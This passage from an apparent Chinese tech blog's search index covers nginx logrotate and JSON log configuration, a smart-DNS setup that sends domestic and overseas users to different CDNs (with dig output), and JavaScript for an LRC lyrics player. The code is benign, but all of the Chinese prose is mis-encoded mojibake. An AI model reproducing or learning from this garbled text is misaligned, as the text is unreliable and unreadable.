plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/*.log &#123;</span><br><span class="line">    daily</span><br><span class="line">    dateext</span><br><span class="line">    rotate 30</span><br><span class="line">    compress</span><br><span class="line">    delaycompress</span><br><span class="line">    notifempty</span><br><span class="line">    sharedscripts</span><br><span class="line">    postrotate</span><br><span class="line">        if [ -f /var/run/nginx.pid ]; then</span><br><span class="line">            kill -USR1 `cat /var/run/nginx.pid`</span><br><span class="line">        fi</span><br><span class="line">    endscript</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li>ç¬¬ä¸€è¡Œè¦å¤„ç†çš„æ—¥å¿—ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ã€‚åé¢<code>{}</code>åŒ…è£¹æ—¥å¿—åˆ‡å‰²çš„é…ç½®é¡¹ã€‚</li><li>dailyï¼šè¡¨ç¤ºæ¯å¤©æ‰§è¡Œä¸€æ¬¡ï¼Œç±»ä¼¼çš„é…ç½®è¿˜æœ‰weekly,monthlyæ¯å‘¨å’Œæ¯æœˆã€‚</li><li>dateextï¼šæ–‡ä»¶åç¼€ä½¿ç”¨æ—¥æœŸå‘½åã€‚</li><li>rotate 30ï¼šä¿ç•™æœ€è¿‘30å¤©çš„æ—¥å¿—ã€‚</li><li>compressï¼šå¯¹æ—¥å¿—è¿›è¡Œå‹ç¼©ã€‚</li><li>delaycompressï¼šå»¶è¿Ÿå‹ç¼©ï¼Œåˆ†å‰²å®Œæˆåå»¶è¿Ÿä¸€å¤©å‹ç¼©æ­¤æ—¥å¿—ã€‚</li><li>notifemptyï¼šå¿½ç•¥ç©ºæ—¥å¿—ã€‚</li><li>sharedscriptsï¼šæ‰§è¡Œè„šæœ¬ã€‚</li><li>postrotateï¼šæ—¥å¿—è¢«åˆ‡å‰²åæ‰§è¡Œçš„è„šæœ¬ï¼Œå¯¹åº”çš„<code>prerotate</code>è¡¨ç¤ºåœ¨åˆ‡å‰²å‰æ‰§è¡Œçš„è„šæœ¬ã€‚</li><li>endscriptï¼šæ ‡è®°è„šæœ¬ç»“æŸã€‚</li><li>æµ‹è¯•ä¸€ä¸‹è„šæœ¬ï¼š<code>logrotate -d /etc/logrotate.d/nginx</code>ã€‚</li><li>æ‰§è¡Œåé¢çš„å‘½ä»¤èƒ½ç«‹å³çœ‹åˆ°æ•ˆæœï¼š<code>logrotate -vf /etc/logrotate.d/nginx</code>ã€‚</li></ul></blockquote></li></ol><h3 id="è¾“å‡ºJSONæ ¼å¼çš„æ—¥å¿—"><a href="#è¾“å‡ºJSONæ ¼å¼çš„æ—¥å¿—" class="headerlink" title="è¾“å‡ºJSONæ ¼å¼çš„æ—¥å¿—"></a>è¾“å‡ºJSONæ ¼å¼çš„æ—¥å¿—</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">log_format json escape=json &#x27;&#123;&#x27;</span><br><span class="line">    &#x27;&quot;remote_addr&quot;: &quot;$remote_addr&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;x_forwarded_for&quot;:  &quot;$http_x_forwarded_for&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;time_iso8601&quot;: &quot;$time_iso8601&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;host&quot;: &quot;$host&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;method&quot;: &quot;$request_method&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;request_uri&quot;: &quot;$request_uri&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;status&quot;: $status,&#x27;</span><br><span class="line">    &#x27;&quot;http_referer&quot;:  &quot;$http_referer&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;body_bytes_sent&quot;: &quot;$body_bytes_sent&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;http_user_agent&quot;: &quot;$http_user_agent&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;request_time&quot;: &quot;$request_time&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;upstream_addr&quot;: &quot;$upstream_addr&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;upstream_response_time&quot;: &quot;$upstream_response_time&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;x_request_id&quot;: &quot;$upstream_http_x_request_id&quot;,&#x27;</span><br><span class="line">    &#x27;&quot;x_response_time&quot;: &quot;$upstream_http_x_response_time&quot;&#x27;</span><br><span class="line">&#x27;&#125;&#x27;;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://nginx.org/en/docs/http/ngx_http_log_module.html">Module ngx_http_log_module</a></li><li><a href="https://linux.cn/article-8227-1.html">é…ç½® logrotate çš„ç»ˆææŒ‡å¯¼</a></li><li><a href="http://nginx.org/en/docs/http/ngx_http_log_module.html#log_format">log_format</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> log </tag>
            
            <tag> logrotate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éƒ¨ç½²å…¨çƒCDNç½‘ç»œ</title>
      <link href="/post/global-cdn.html"/>
      <url>/post/global-cdn.html</url>
      
        <content type="html"><![CDATA[<h2 id="éƒ¨ç½²å…¨çƒCDNç½‘ç»œ"><a href="#éƒ¨ç½²å…¨çƒCDNç½‘ç»œ" class="headerlink" title="éƒ¨ç½²å…¨çƒCDNç½‘ç»œ"></a>éƒ¨ç½²å…¨çƒCDNç½‘ç»œ</h2><p>æˆ‘ä»¬ç°åœ¨é™¤äº†å¤§é™†çš„è¿˜æœ‰ç¾å›½åŠä¸œå—äºšçš„ç”¨æˆ·ï¼Œåœ¨å›½å†…å¯ä»¥ä½¿ç”¨<a href="https://www.aliyun.com/product/cdn">é˜¿é‡Œ</a>æˆ–è€…<a href="https://cloud.tencent.com/product/cdn">è…¾è®¯</a>çš„CDNæœåŠ¡ã€‚ä½†æ˜¯ä¸Šé¢ä¸¤å®¶åœ¨å›½å¤–çš„èŠ‚ç‚¹ä¸æ˜¯å¾ˆå¤šï¼Œè€Œå›½å¤–å‚å•†æœ‰<a href="https://aws.amazon.com/cloudfront/">Amazon CloudFront</a>å’Œ<a href="https://www.cloudflare.com/">Cloudflare</a>åœ¨å¤§é™†åœ°åŒºçš„æœåŠ¡åˆä¸å¥½ã€‚é‚£æœ‰æ²¡æœ‰åŠæ³•è®©ä¸€ä¸ªåŸŸåå¤§é™†ç”¨æˆ·ä½¿ç”¨é˜¿é‡Œçš„æœåŠ¡ï¼Œå›½å¤–çš„ç”¨æˆ·æ˜¯ç”¨CloudFrontæœåŠ¡å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œæˆ‘ä»¬çŸ¥é“ç°åœ¨ä¸»æµçš„CDNéƒ½æ˜¯é‡‡ç”¨CNAMEçš„å½¢å¼é…ç½®DNSã€‚CNAMEçš„æ ¸å¿ƒå°±æ˜¯æ™ºèƒ½DNSï¼Œé‚£æˆ‘ä»¬å¦‚æœæ­å»ºä¸€ä¸ªDNSè®©å®ƒç»™å›½å†…å¤–ç”¨æˆ·è¿”å›ä¸åŒçš„CNAMEä¸å°±è§£å†³äº†å—ï¼Œä¹Ÿå°±æ˜¯CDNçš„DNSã€‚æ‰€å¹¸ï¼Œä¸ç”¨æˆ‘ä»¬éº»çƒ¦è‡ªå·±å»æ­å»ºè¿™ä¸ªæ™ºèƒ½DNSï¼Œç°åœ¨åƒé˜¿é‡Œçš„äº‘DNSå’ŒDNSPodéƒ½æä¾›äº†æ¯”æˆ‘ä»¬éœ€æ±‚æ›´å¼ºå¤§çš„åŠŸèƒ½ã€‚ä¸‹é¢æ˜¯å…·ä½“ç½‘ç»œæ‹“æ‰‘å›¾ï¼š</p><p><img src="/images/global-dns.png" alt="æš‚ç¼º"></p><h3 id="å…·ä½“æ“ä½œ"><a href="#å…·ä½“æ“ä½œ" class="headerlink" title="å…·ä½“æ“ä½œ"></a>å…·ä½“æ“ä½œ</h3><blockquote><p>ç”±äºæš‚æ—¶æ²¡æœ‰Amazon CloudFrontå’ŒCloudflareè´¦å·ï¼Œå›½å¤–CDNæˆ‘å°±ç”¨è…¾è®¯CDNæ¨¡æ‹Ÿäº†ã€‚å®é™…æ“ä½œæ—¶å°†è…¾è®¯CDNæ¢æˆAmazon CloudFrontæˆ–Cloudflareå³å¯ã€‚</p></blockquote><ol><li><p>é¦–å…ˆåˆ†åˆ«åœ¨é˜¿é‡ŒCDNå’Œè…¾è®¯CDNå¼€å¯æœåŠ¡</p><p> é˜¿é‡ŒCDNï¼šs.kekek.cc.w.kunlunar.com.<br> <img src="/images/cdn-cn-kekek.png" alt="é˜¿é‡ŒCDN"></p><p> è…¾è®¯CDNï¼šs.kekek.cc.cdn.dnsv1.com.<br> <img src="/images/cdn-world-kekek.png" alt="è…¾è®¯CDN"></p></li><li><p>ä¸ºåŸŸåé…ç½®æ™ºèƒ½DNS</p><p> å¢ƒå¤–æœåŠ¡é…ç½®ä¸ºè…¾è®¯DNSçš„CNAMEï¼Œé»˜è®¤çº¿è·¯ï¼ˆå¢ƒå†…ï¼‰é…ç½®ä¸ºé˜¿é‡ŒCDNçš„CNANMEã€‚<br> <img src="/images/dns-kekek.png"></p></li></ol><p>ä¸‹é¢æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹çº¿è·¯ï¼š</p><ol><li>114dns</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ dig @114.114.114.114 s.kekek.cc CNAME</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @114.114.114.114 s.kekek.cc CNAME</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 41126</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;s.kekek.cc.INCNAME</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">s.kekek.cc.600INCNAMEs.kekek.cc.w.kunlunar.com.</span><br><span class="line"></span><br><span class="line">;; Query time: 2735 msec</span><br><span class="line">;; SERVER: 114.114.114.114#53(114.114.114.114)</span><br><span class="line">;; WHEN: Wed Jul 04 23:28:47 CST 2018</span><br><span class="line">;; MSG SIZE  rcvd: 67</span><br></pre></td></tr></table></figure><ol start="2"><li><p>Cloudflare DNS</p><blockquote><p>ä½¿ç”¨ 1.1.1.1 DNSç›¸å½“äºæ¨¡æ‹Ÿç”¨æˆ·åœ¨å¢ƒå¤–è¿›è¡ŒDNSæŸ¥è¯¢ã€‚</p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ dig @1.1.1.1 s.kekek.cc CNAME</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; @1.1.1.1 s.kekek.cc CNAME</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 5551</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 1452</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;s.kekek.cc.INCNAME</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">s.kekek.cc.345INCNAMEs.kekek.cc.cdn.dnsv1.com.</span><br><span class="line"></span><br><span class="line">;; Query time: 320 msec</span><br><span class="line">;; SERVER: 1.1.1.1#53(1.1.1.1)</span><br><span class="line">;; WHEN: Wed Jul 04 23:27:39 CST 2018</span><br><span class="line">;; MSG SIZE  rcvd: 77</span><br></pre></td></tr></table></figure></li></ol><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆ‘ä»¬ä½¿ç”¨114DNSæ—¶ï¼Œè¿”å›çš„CNAMEä¸º<code>s.kekek.cc.w.kunlunar.com.</code>ï¼Œå¯¹åº”çš„å°±æ˜¯æˆ‘ä»¬é…ç½®çš„é˜¿é‡ŒCDNã€‚ä½¿ç”¨Cloudflare DNSæ˜¯æ¨¡æ‹Ÿæµ·å¤–ç”¨æˆ·å¾—åˆ°çš„CNAMEæ˜¯<code>s.kekek.cc.cdn.dnsv1.com.</code>ï¼Œè¿™ä¸ªåˆšå¥½æ˜¯æˆ‘ä»¬è…¾è®¯çš„CDNã€‚</p><p>ç°åœ¨æˆ‘ä»¬å¢ƒå†…ç”¨æˆ·è®¿é—®<a href="http://ss.kekek.cc/">s.kekek.cc</a>æ—¶å°±å¯ä»¥ä½¿ç”¨é˜¿é‡Œçš„CDNæä¾›åŠ é€Ÿäº†ï¼Œå¢ƒå¤–ç”¨æˆ·è®¿é—®æ—¶å°±å¯ä»¥ç”±è…¾è®¯CDNæä¾›åŠ é€ŸæœåŠ¡äº†ã€‚</p><h3 id="å›½å†…å¤–æºç«™é—®é¢˜"><a href="#å›½å†…å¤–æºç«™é—®é¢˜" class="headerlink" title="å›½å†…å¤–æºç«™é—®é¢˜"></a>å›½å†…å¤–æºç«™é—®é¢˜</h3><p>å¯¹äºå›½å†…å¤–æ˜¯å¦æ˜¯ç”¨åŒä¸€ä¸ªæºç«™ï¼Œä¸¤è€…éƒ½å¯ã€‚å¯ä»¥æ ¹æ®å®é™…æƒ…å†µå»æµ‹è¯•å“ªç§æ›´ç¬¦åˆè‡ªèº«ä¸šåŠ¡ï¼Œä»æ´›æ‰çŸ¶åˆ°ä¸Šæµ·çš„æœ€å°å»¶è¿Ÿåœ¨<code>180ms</code>å·¦å³ï¼Œä¹Ÿå°±æ˜¯è¯´å¢ƒå¤–ç”¨æˆ·è®¿é—®é¦–æ¬¡åŠ è½½çš„æ–°èµ„æºæ—¶ä¼šå‡ºç°æ¯”è¾ƒä¸¥é‡çš„å»¶è¿Ÿã€‚å¦‚æœå¯¹é¦–æ¬¡åŠ è½½å»¶è¿Ÿå¤ªåœ¨æ„å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæºç«™ï¼Œå¦‚æœ<strong>é¢‘ç¹</strong>å›æºå¯è€ƒè™‘å¢ƒå†…å¢ƒå¤–ä½¿ç”¨ä¸åŒçš„æºç«™ã€‚</p><p>ä½¿ç”¨ä¸åŒæºç«™æ—¶å¯ä»¥é‡‡ç”¨ä¸»åŠ¨æ–‡ä»¶åŒæ­¥ã€<a href="nginx-proxy-cache.html">Nginxä»£ç†ç¼“å­˜</a>ç­‰æ–¹æ¡ˆåŒæ­¥ä¸¤ä¸ªæºç«™èµ„æºã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LRCæ’­æ”¾å™¨</title>
      <link href="/post/lrc-player.html"/>
      <url>/post/lrc-player.html</url>
      
        <content type="html"><![CDATA[<h2 id="LRCæ’­æ”¾å™¨"><a href="#LRCæ’­æ”¾å™¨" class="headerlink" title="LRCæ’­æ”¾å™¨"></a>LRCæ’­æ”¾å™¨</h2><iframe scrolling="no" width="100%" height="300" src="https://jsfiddle.net/ac35otdk/embedded/result,html,js,css/light/" frameborder="0" loading="lazy" allowfullscreen="allowfullscreen"></iframe><figure class="highlight js"><figcaption><span>lrc_player.js</span><a href="/downloads/code/lrc_player.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">toSecond</span>(<span class="params">time</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">`1970-01-01T<span class="subst">${time}</span>Z`</span>).<span class="title function_">getTime</span>() / <span class="number">1000</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ’­æ”¾æ­Œè¯</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  {<span class="type"> </span></span></span><br><span class="line"><span class="type"><span class="comment"> *              lyrics, æ­Œè¯ï¼Œæ ¼å¼ä¸ºäºŒç»´æ•°ç»„ã€‚e.g. [ [&#x27;00:00:00.40&#x27;, &#x27;å‘¨æ°ä¼¦ - ç­‰ä½ ä¸‹è¯¾ (with æ¨ç‘ä»£)&#x27;], [&#x27;00:00:03.94&#x27;, &#x27;è¯ï¼šå‘¨æ°ä¼¦&#x27;], [&#x27;00:00:05.21&#x27;, &#x27;æ›²ï¼šå‘¨æ°ä¼¦&#x27;] ]</span></span></span><br><span class="line"><span class="type"><span class="comment"> *              seek  = &#x27;00:00:00&#x27;, å¼€å§‹æ—¶é—´</span></span></span><br><span class="line"><span class="type"><span class="comment"> *              print = (lyric) =&gt; console.log(lyric), æ­Œè¯å›è°ƒ</span></span></span><br><span class="line"><span class="type"><span class="comment"> *              interval = 50 åˆ·æ–°æ£€æµ‹é—´éš” ms</span></span></span><br><span class="line"><span class="type"><span class="comment"> *          </span>}</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">play</span>(<span class="params">{ lyrics, seek = <span class="string">&#x27;00:00:00&#x27;</span>, print = (lyric) =&gt; <span class="variable language_">console</span>.log(lyric), interval = <span class="number">50</span> }</span>) {</span><br><span class="line">    seek = <span class="title function_">toSecond</span>(seek);</span><br><span class="line">    lyrics = lyrics.<span class="title function_">map</span>(<span class="function"><span class="params">lyric</span> =&gt;</span> [<span class="title function_">toSecond</span>(lyric[<span class="number">0</span>]), lyric[<span class="number">1</span>]]).<span class="title function_">sort</span>(<span class="function">(<span class="params">lyric1, lyric2</span>) =&gt;</span> lyric1[<span class="number">0</span>] - lyric2[<span class="number">0</span>]).<span class="title function_">filter</span>(<span class="function"><span class="params">lyric</span> =&gt;</span> lyric[<span class="number">0</span>] &gt;= seek);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setIntervalå’ŒsetTimeoutåœ¨æµè§ˆå™¨çª—å£éæ¿€æ´»çš„çŠ¶æ€ä¸‹ä¼šåœæ­¢å·¥ä½œæˆ–è€…ä»¥ææ…¢çš„é€Ÿåº¦å·¥ä½œ</span></span><br><span class="line">    <span class="comment">// å¯ä»¥ä½¿ç”¨ Web Worker è§£å†³æˆ–è€… requestAnimationFrame è§£å†³[æ›´æ–°ï¼šç»è¿‡æµ‹è¯•çª—å£å¤„äºéæ¿€æ´»çŠ¶æ€ä¸‹ requestAnimationFrame ä¹Ÿä¼šåœæ­¢å·¥ä½œ]</span></span><br><span class="line">    <span class="comment">// [RAF replacements for setTimeout and setInterval](https://bl.ocks.org/joyrexus/7304146)</span></span><br><span class="line">    <span class="comment">// @see https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame</span></span><br><span class="line">    <span class="keyword">const</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (lyrics.<span class="property">length</span> === <span class="number">0</span>) <span class="keyword">return</span> <span class="built_in">clearInterval</span>(timer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// seek ä¹‹å‰çš„å…¨éƒ¨æ˜¾ç¤º </span></span><br><span class="line">        <span class="keyword">while</span> (lyrics.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; lyrics[<span class="number">0</span>][<span class="number">0</span>] &lt;= seek) <span class="title function_">print</span>(lyrics.<span class="title function_">shift</span>()[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        seek += (interval / <span class="number">1000</span>);</span><br><span class="line">    }, interval);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> timer;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><ul><li><input checked="" disabled="" type="checkbox"> ä½¿ç”¨RAFæ¨¡æ‹ŸsetInterval</li><li><input checked="" disabled="" type="checkbox"> å°è£…ä¸ºå¯¹è±¡ï¼Œæ”¯æŒplayã€pauseã€resumeã€seekã€resetç­‰åŠŸèƒ½</li></ul><figure class="highlight js"><figcaption><span>lrc_player_class.js</span><a href="/downloads/code/lrc_player_class.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LRCPlayer</span> {</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">{ lyrics, print = (lyric) =&gt; <span class="variable language_">console</span>.log(lyric), done = () =&gt; { }, interval = <span class="number">50</span> }</span>) {</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lyrics</span> = lyrics;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">print</span> = print;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">done</span> = done;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">interval</span> = interval;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">seek</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_timer</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&#x27;INIT&#x27;</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ’­æ”¾ï¼ˆæ”¯æŒseekï¼‰</span></span><br><span class="line">    <span class="title function_">play</span>(<span class="params">seek = <span class="string">&#x27;00:00:00&#x27;</span></span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> === <span class="string">&#x27;PLAY&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> !== <span class="string">&#x27;PAUSE&#x27;</span>) {</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">seek</span> = <span class="title function_">toSecond</span>(seek);</span><br><span class="line">        }</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&#x27;PLAY&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> lyrics = <span class="variable language_">this</span>.<span class="property">lyrics</span>.<span class="title function_">map</span>(<span class="function"><span class="params">lyric</span> =&gt;</span> [<span class="title function_">toSecond</span>(lyric[<span class="number">0</span>]), lyric[<span class="number">1</span>]]).<span class="title function_">sort</span>(<span class="function">(<span class="params">lyric1, lyric2</span>) =&gt;</span> lyric1[<span class="number">0</span>] - lyric2[<span class="number">0</span>]).<span class="title function_">filter</span>(<span class="function"><span class="params">lyric</span> =&gt;</span> lyric[<span class="number">0</span>] &gt;= <span class="variable language_">this</span>.<span class="property">seek</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_timer</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">            <span class="keyword">if</span> (lyrics.<span class="property">length</span> === <span class="number">0</span>) {</span><br><span class="line">                <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">_timer</span>);</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">done</span>();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="comment">// seek ä¹‹å‰çš„å…¨éƒ¨æ˜¾ç¤º</span></span><br><span class="line">            <span class="keyword">while</span> (lyrics.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; lyrics[<span class="number">0</span>][<span class="number">0</span>] &lt;= <span class="variable language_">this</span>.<span class="property">seek</span>) <span class="variable language_">this</span>.<span class="title function_">print</span>(lyrics.<span class="title function_">shift</span>()[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">seek</span> += (<span class="variable language_">this</span>.<span class="property">interval</span> / <span class="number">1000</span>);</span><br><span class="line">        }, <span class="variable language_">this</span>.<span class="property">interval</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æš‚åœ</span></span><br><span class="line">    <span class="title function_">pause</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> === <span class="string">&#x27;PAUSE&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&#x27;PAUSE&#x27;</span>;</span><br><span class="line">        <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">_timer</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç»§ç»­æ’­æ”¾</span></span><br><span class="line">    <span class="title function_">resume</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> === <span class="string">&#x27;PAUSE&#x27;</span>) <span class="variable language_">this</span>.<span class="title function_">play</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡æ–°å¼€å§‹</span></span><br><span class="line">    <span class="title function_">reset</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">pause</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = <span class="string">&#x27;INIT&#x27;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">play</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://bl.ocks.org/joyrexus/7304146">RAF replacements for setTimeout and 